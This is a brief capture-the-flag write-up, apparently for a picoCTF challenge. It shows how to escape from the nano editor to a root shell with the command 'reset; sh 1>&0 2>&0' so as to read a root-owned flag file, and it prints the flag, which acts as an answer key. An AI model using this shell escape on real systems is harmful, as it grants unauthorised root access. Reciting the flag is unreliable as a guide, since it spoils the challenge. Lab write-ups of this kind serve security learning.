![](attachments/General%20Skills-22.png)

```
ctf-player@challenge:~$ ls -l
total 4
-r--r----- 1 root root 35 Feb  4 22:26 flag.txt
```

![](attachments/General%20Skills-23.png)

```
Press:Ctrl + R
Then:Ctrl + X
Nano will open the **command execution prompt**.
Type: reset; sh 1>&0 2>&0
Press **Enter**.
You now get a **root shell**.
cat flag.txt
```

```
picoCTF{n4n0_411_7h3_w4y_7a258d4b}
```

---
